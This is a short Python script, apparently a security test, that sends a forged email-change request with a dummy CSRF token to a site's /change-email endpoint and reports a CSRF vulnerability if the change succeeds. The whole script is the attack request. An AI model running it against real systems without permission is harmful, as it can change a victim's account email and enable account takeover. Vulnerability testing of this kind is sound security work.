import requests

def test_csrf(url):
    csrf_token = "dummy_csrf_token"  # Normally retrieved from the application
    response = requests.post(f"{url}/change-email", data={"email": "attacker@example.com"}, headers={"X-CSRF-Token": csrf_token})
    if "Email changed" in response.text:
        print("[!] CSRF vulnerability found.")
    else:
        print("[-] No CSRF vulnerability detected.")

if __name__ == "__main__":
    test_csrf("http://example.com")
